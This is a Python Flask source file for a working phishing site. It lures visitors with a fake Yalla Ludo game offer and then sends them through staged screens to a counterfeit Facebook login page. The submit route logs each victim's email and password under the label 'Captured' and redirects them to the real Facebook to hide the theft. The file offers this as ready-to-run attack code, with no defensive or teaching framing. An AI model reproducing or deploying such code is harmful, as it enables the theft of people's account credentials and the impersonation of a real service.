from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# -------- 1. LOADING SCREEN --------
index_html = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; padding: 0; height: 100vh; background: #fff; display: flex; align-items: center; justify-content: center; }
        .bg { width: 100%; height: 100%; background: url('https://i.postimg.cc/HkCL9Rm6/Screenshot-20260405-175350-Google.jpg') center/cover; position: fixed; }
        .spinner { width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; z-index: 10; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
    <script>setTimeout(() => { window.location.href = "/offer"; }, 5000);</script>
</head>
<body>
    <div class="bg"></div>
    <div class="spinner"></div>
</body>
</html>
"""

# -------- 2. OFFER IMAGE --------
offer_html = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background: #1c9e74; display: flex; justify-content: center; }
        .screen { width: 100%; max-width: 450px; height: 100vh; background: url('https://i.postimg.cc/9MFrFzV6/Screenshot-20260406-152311-Chrome.jpg') center/contain no-repeat; }
    </style>
    <script>setTimeout(() => { window.location.href = "/accept"; }, 5000);</script>
</head>
<body><div class="screen"></div></body>
</html>
"""

# -------- 3. ACCEPT CLICK PAGE --------
accept_html = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; }
        .screen { width: 100%; max-width: 400px; height: 100vh; background: url('https://i.postimg.cc/yxvw3JVD/IMG-20260405-WA0021.jpg') center/cover no-repeat; position: relative; }
        .btn { position: absolute; top: 57.5%; left: 8%; width: 84%; height: 7.5%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="screen"><a href="/selection" class="btn"></a></div>
</body>
</html>
"""

# -------- 4. LOGIN SELECTION (MODAL PAGE) --------
selection_html = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; font-family: sans-serif; }
        .screen { width: 100%; max-width: 400px; height: 100vh; background: url('https://i.postimg.cc/hjybKkFm/Screenshot-20260406-152334-Chrome.jpg') center/cover no-repeat; position: relative; }
        
        /* Error Message Style */
        #error { position: absolute; top: 10px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 10px; border-radius: 5px; font-size: 14px; display: none; width: 80%; text-align: center; z-index: 100; }

        /* Invisible Click Areas over buttons in pic */
        .fb-btn { position: absolute; top: 41.5%; left: 5%; width: 90%; height: 7.5%; cursor: pointer; }
        .other-btn { position: absolute; width: 90%; height: 7.5%; left: 5%; cursor: pointer; }
        .tw { top: 51%; }
        .gm { top: 61%; }
        .ph { top: 70%; }
    </style>
    <script>
        function showError() {
            var e = document.getElementById('error');
            e.style.display = 'block';
            setTimeout(() => { e.style.display = 'none'; }, 3000);
        }
    </script>
</head>
<body>
    <div class="screen">
        <div id="error">You can't use this feature at the moment "Try With Another Account"</div>
        
        <a href="/login-page" class="fb-btn"></a>
        
        <div class="other-btn tw" onclick="showError()"></div>
        <div class="other-btn gm" onclick="showError()"></div>
        <div class="other-btn ph" onclick="showError()"></div>
    </div>
</body>
</html>
"""

# -------- 5. FINAL FB LOGIN PAGE --------
login_page_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background-color: #eceff5; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 500px; text-align: center; }
        .header { background-color: #3b5998; padding: 15px; color: white; font-size: 28px; font-weight: bold; }
        .content { padding: 20px; }
        .ludo-logo { width: 75px; height: 75px; border-radius: 12px; }
        .info-text { color: #898f9c; font-size: 16px; margin: 20px 0; }
        .input-group { background: white; border: 1px solid #dddfe2; border-radius: 4px; margin: 0 20px; }
        input { width: 100%; padding: 12px; border: none; outline: none; font-size: 16px; }
        input:first-child { border-bottom: 1px solid #dddfe2; }
        .login-btn { width: 92%; background-color: #1877f2; color: white; border: none; padding: 10px; font-size: 18px; font-weight: bold; border-radius: 4px; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">facebook</div>
    <div class="content">
        <img src="https://i.postimg.cc/QxRsnCz8/Screenshot-20260406-152438-Gallery.jpg" class="ludo-logo">
        <p class="info-text">Log in to your Facebook account to connect with YALLA LUDO</p>
    </div>
    <form action="/submit" method="POST">
        <div class="input-group">
            <input type="text" placeholder="Phone number or email" name="email" required>
            <input type="password" placeholder="password" name="pass" required>
        </div>
        <button type="submit" class="login-btn">login</button>
    </form>
</div>
</body>
</html>
"""

@app.route("/")
def home(): return render_template_string(index_html)

@app.route("/offer")
def offer(): return render_template_string(offer_html)

@app.route("/accept")
def accept(): return render_template_string(accept_html)

@app.route("/selection")
def selection(): return render_template_string(selection_html)

@app.route("/login-page")
def login_page(): return render_template_string(login_page_html)

@app.route("/submit", methods=["POST"])
def submit():
    print(f"Captured: {request.form.get('email')} | {request.form.get('pass')}")
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
